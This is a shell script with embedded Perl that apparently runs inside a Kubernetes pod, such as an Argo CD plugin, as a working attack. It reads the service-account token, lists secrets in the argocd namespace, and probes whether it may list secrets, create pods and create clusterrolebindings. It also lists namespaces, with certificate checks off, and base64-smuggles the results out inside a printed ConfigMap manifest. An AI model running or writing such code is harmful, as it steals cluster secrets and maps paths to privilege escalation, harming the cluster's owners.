#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"

RECON=$( (
  echo "===SECRETS_LIST==="
  perl -MIO::Socket::SSL -e '
my $token = shift;
my $host = shift;
my ($h,$p) = split(/:/, $host);
my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die "connect: $!";
print $sock "GET /api/v1/namespaces/argocd/secrets HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
my ($b) = $r =~ /\r\n\r\n(.*)/s;
print substr($b, 0, 4000);
' "$TOKEN" "$APISERVER" 2>/dev/null

  echo ""
  echo "===SELFSSAR_LIST_SECRETS==="
  perl -MIO::Socket::SSL -e '
my $token = shift;
my $host = shift;
my ($h,$p) = split(/:/, $host);
my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"argocd","verb":"list","resource":"secrets"}}}|;
my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
my ($b) = $r =~ /\r\n\r\n(.*)/s;
print substr($b,0,3000);
' "$TOKEN" "$APISERVER" 2>/dev/null

  echo ""
  echo "===SELFSSAR_CREATE_POD==="
  perl -MIO::Socket::SSL -e '
my $token = shift;
my $host = shift;
my ($h,$p) = split(/:/, $host);
my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"argocd","verb":"create","resource":"pods"}}}|;
my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
my ($b) = $r =~ /\r\n\r\n(.*)/s;
print substr($b,0,3000);
' "$TOKEN" "$APISERVER" 2>/dev/null

  echo ""
  echo "===SELFSSAR_CLUSTERADMIN==="
  perl -MIO::Socket::SSL -e '
my $token = shift;
my $host = shift;
my ($h,$p) = split(/:/, $host);
my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"create","resource":"clusterrolebindings","group":"rbac.authorization.k8s.io"}}}|;
my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
my ($b) = $r =~ /\r\n\r\n(.*)/s;
print substr($b,0,3000);
' "$TOKEN" "$APISERVER" 2>/dev/null

  echo ""
  echo "===TRY_LIST_NAMESPACES==="
  perl -MIO::Socket::SSL -e '
my $token = shift;
my $host = shift;
my ($h,$p) = split(/:/, $host);
my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
print $sock "GET /api/v1/namespaces HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
my ($b) = $r =~ /\r\n\r\n(.*)/s;
print substr($b, 0, 2000);
' "$TOKEN" "$APISERVER" 2>/dev/null
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: k8sapi
data:
  result: $RECON
EOF
exit 0